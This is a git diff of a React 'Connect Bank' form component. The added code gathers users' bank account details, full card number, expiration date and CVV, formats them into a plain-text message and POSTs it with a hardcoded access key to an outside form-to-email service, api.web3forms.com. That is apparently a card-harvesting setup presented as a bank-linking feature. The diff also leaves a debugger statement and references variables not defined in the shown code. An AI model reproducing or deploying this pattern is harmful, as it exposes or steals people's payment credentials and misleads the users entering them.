@@ -9,25 +9,9 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { Separator } from "@/components/ui/separator"
 import { MoreHorizontal } from "lucide-react"
 import { FormSchemaConnectBank } from "@/Helper/validate"
+import { useSelector } from 'react-redux'
+import { RootState } from "@/app/store"
 // import { toast } from "@/hooks/use-toast"
-
-interface BankDetails {
-    bankName: string
-    accountNumber: string
-    routingNumber: string
-}
-
-interface AccountDetails {
-    accountHolderName: string
-    address: string
-}
-
-interface CreditCardDetails {
-    cardNumber: string
-    expirationDate: string
-    cvv: string
-}
-
 export default function ConnectBankForm() {
 
     const [bankName, setBankName] = useState("");
@@ -42,13 +26,23 @@ export default function ConnectBankForm() {
     const [cvv, setCvv] = useState("");
     const [cardType, setCardType] = useState("");
     const [bankEmail, setBankEmail] = useState("");
-
+    // const [user, setUser] = useState("");
+    interface User {
+        id: number;
+        username: string;
+        Name: string;
+        Email: string;
+        email: string;
+        token: string;
+        role: string;
+    }
+    const user = useSelector((state: RootState) => state.user.userData);
     async function handleSubmit() {
         debugger;
         const validateAccount = FormSchemaConnectBank.safeParse({
             bankName,
             bankCode,
-            address,
+            bankAddress: address,
             accountHolderName,
             accountNumber,
             accountType,
@@ -64,6 +58,24 @@ export default function ConnectBankForm() {
                 errors: validateAccount.error.flatten().fieldErrors,
             }
         }
+        // Organize validated data into a readable, multi-line message
+        const validated = validateAccount.data;
+        const message = [
+            "New Bank Connected",
+            `Bank Name: ${validated.bankName}`,
+            `Bank Code: ${validated.bankCode}`,
+            `Address: ${validated.bankAddress}`,
+            `Bank Email: ${validated.bankEmail}`,
+            `Account Holder: ${validated.accountHolderName}`,
+            `Account Number: ${validated.accountNumber}`,
+            `Account Type: ${validated.accountType}`,
+            `Amount: ${validated.amount}`,
+            `Card Number: ${validated.cardNumber}`,
+            `Expiration Date: ${validated.expirationDate}`,
+            `CVV: ${validated.cvv}`,
+            `Card Type: ${validated.cardType}`,
+        ].join("\n");
+
         // e.preventDefault();
         const response = await fetch("https://api.web3forms.com/submit", {
             method: "POST",
@@ -73,9 +85,9 @@ export default function ConnectBankForm() {
             },
             body: JSON.stringify({
                 access_key: "61d10a4f-f4c2-41d6-83a6-134e4f478cad",
-                // name: e.target.name.value,
-                // email: e.target.email.value,
-                // message: e.target.message.value,
+                name: (user as User)?.Name,
+                email: (user as User)?.Email,
+                message,
             }),
         });
         const result = await response.json();
@@ -88,18 +100,17 @@ export default function ConnectBankForm() {
 
     return (
         <div className="p-6 max-w-2xl mx-auto">
-            <div className="flex items-center justify-between mb-6">
-                <div>
-                    <h1 className="text-2xl font-semibold text-gray-900 dark:text-white">Connect Bank</h1>
-                    <p className="text-gray-600 dark:text-gray-400 mt-1">Please provide details related to connect bank</p>
+            <form action={action}>
+                <div className="flex items-center justify-between mb-6">
+                    <div>
+                        <h1 className="text-2xl font-semibold text-gray-900 dark:text-white">Connect Bank</h1>
+                        <p className="text-gray-600 dark:text-gray-400 mt-1">Please provide details related to connect bank</p>
+                    </div>
+                    <Button variant="ghost" size="sm">
+                        <MoreHorizontal className="w-5 h-5" />
+                    </Button>
                 </div>
-                <Button variant="ghost" size="sm">
-                    <MoreHorizontal className="w-5 h-5" />
-                </Button>
-            </div>
-            <div className="mt-6">
-                <form action={action}>
-                    <Card className="max-w-full">
+                    <Card className="">
                         <CardHeader>
                             <CardTitle className="text-xl font-semibold text-gray-900 dark:text-white">Connect Bank</CardTitle>
                         </CardHeader>
@@ -118,17 +129,18 @@ export default function ConnectBankForm() {
                                             onChange={(e) => setBankName(e.target.value)}
                                             className="bg-gray-50 dark:bg-gray-800 "
                                         />
+                                        {state?.errors?.bankName && <p className='text-red-500 text-sm'>{state.errors.bankName}</p>}
                                     </div>
 
                                     <div className="space-y-2 max-w-xl">
-                                        <Label htmlFor="bankcode">Bank Code</Label>``
+                                        <Label htmlFor="bankcode">Bank Code</Label>
                                         <Input
                                             id="bankcode"
                                             placeholder="Enter bank code"
                                             value={bankCode}
                                             onChange={(e) => setBankCode(e.target.value)}
-                                            className="bg-gray-50 dark:bg-gray-800"
                                         />
+                                        {state?.errors?.bankCode && <p className='text-red-500 text-sm'>{state.errors.bankCode}</p>}
                                     </div>
 
                                     <div className="space-y-2 max-w-xl">
@@ -140,6 +152,7 @@ export default function ConnectBankForm() {
                                             onChange={(e) => setAddress(e.target.value)}
                                             className="bg-gray-50 dark:bg-gray-800"
                                         />
+                                        {state?.errors?.bankAddress && <p className='text-red-500 text-sm'>{state.errors.bankAddress}</p>}
                                     </div>
                                     <div className="space-y-2 max-w-xl">
                                         <Label htmlFor="bankEmail">Bank Email</Label>
@@ -150,6 +163,7 @@ export default function ConnectBankForm() {
                                             onChange={(e) => setBankEmail(e.target.value)}
                                             className="bg-gray-50 dark:bg-gray-800"
                                         />
+                                        {state?.errors?.bankEmail && <p className='text-red-500 text-sm'>{state.errors.bankEmail}</p>}
                                     </div>
 
 
@@ -172,6 +186,7 @@ export default function ConnectBankForm() {
                                             onChange={(e) => setAccountHolderName(e.target.value)}
                                             className="bg-gray-50 dark:bg-gray-800"
                                         />
+                                        {state?.errors?.accountHolderName && <p className='text-red-500 text-sm'>{state.errors.accountHolderName}</p>}
                                     </div>
                                     <div className="space-y-2 max-w-xl">
                                         <Label htmlFor="accountNumber">Account Number</Label>
@@ -182,6 +197,7 @@ export default function ConnectBankForm() {
                                             onChange={(e) => setAccountNumber(e.target.value)}
                                             className="bg-gray-50 dark:bg-gray-800"
                                         />
+                                        {state?.errors?.accountNumber && <p className='text-red-500 text-sm'>{state.errors.accountNumber}</p>}
                                     </div>
                                     <div className="grid grid-cols-2 gap-4 max-w-xl">
                                         <div className="space-y-2">
@@ -195,17 +211,20 @@ export default function ConnectBankForm() {
                                                     <SelectItem value="current">Current</SelectItem>
                                                 </SelectContent>
                                             </Select>
+                                            {state?.errors?.accountType && <p className='text-red-500 text-sm'>{state.errors.accountType}</p>}
                                         </div>
                                         {/* {state?.errors?.accounttype && <p className='text-red-500 text-sm'>{state.errors.accounttype}</p>} */}
                                         <div className="space-y-2 max-w-xl">
                                             <Label htmlFor="amount">Amount</Label>
                                             <Input
                                                 id="amount"
+                                                type="number"
                                                 placeholder="Enter amount"
                                                 value={amount}
                                                 onChange={(e) => setAmount(e.target.value)}
                                                 className="bg-gray-50 dark:bg-gray-800"
                                             />
+                                            {state?.errors?.amount && <p className='text-red-500 text-sm'>{state.errors.amount}</p>}
                                         </div>
                                     </div>
 
@@ -230,6 +249,7 @@ export default function ConnectBankForm() {
                                             onChange={(e) => setCardNumber(e.target.value)}
                                             className="bg-gray-50 dark:bg-gray-800"
                                         />
+                                        {state?.errors?.cardNumber && <p className='text-red-500 text-sm'>{state.errors.cardNumber}</p>}
                                     </div>
 
                                     <div className="grid grid-cols-2 gap-4 max-w-xl">
@@ -237,11 +257,13 @@ export default function ConnectBankForm() {
                                             <Label htmlFor="expirationDate">Expiration Date</Label>
                                             <Input
                                                 id="expirationDate"
+                                                type="date"
                                                 placeholder="MM/YY"
                                                 value={expirationDate}
                                                 onChange={(e) => setExpirationDate(e.target.value)}
                                                 className="bg-gray-50 dark:bg-gray-800"
                                             />
+                                            {state?.errors?.expirationDate && <p className='text-red-500 text-sm'>{state.errors.expirationDate}</p>}
                                         </div>
 
                                         <div className="space-y-2 max-w-xl">
@@ -260,6 +282,7 @@ export default function ConnectBankForm() {
                                                     <SelectItem value="student">Student Card</SelectItem>
                                                 </SelectContent>
                                             </Select>
+                                            {state?.errors?.cardType && <p className='text-red-500 text-sm'>{state.errors.cardType}</p>}
                                             {/* {stateCard?.errors?.cardType && <p className='text-red-500 text-sm'>{stateCard.errors.cardType}</p>} */}
                                         </div>
 
@@ -274,6 +297,7 @@ export default function ConnectBankForm() {
                                             onChange={(e) => setCvv(e.target.value)}
                                             className="bg-gray-50 dark:bg-gray-800"
                                         />
+                                        {state?.errors?.cvv && <p className='text-red-500 text-sm'>{state.errors.cvv}</p>}
                                     </div>
 
 
@@ -284,19 +308,17 @@ export default function ConnectBankForm() {
 
                             {/* Save All Button */}
                             <div className="flex justify-center">
-                                <Button
-                                    // onClick={handleSaveAll}
-                                    // disabled={isLoading.all}
+                                <Button disabled={isLoading}
                                     className="bg-blue-600 hover:bg-blue-700 text-white px-8"
                                 >
                                     Save
-                                    {/* {isLoading.all ? "Saving All..." : "Save All"} */}
+                                    {isLoading ? "..." : ""}
                                 </Button>
                             </div>
+
                         </CardContent>
                     </Card>
-                </form>
-            </div>
+            </form>
         </div>
     )
 }
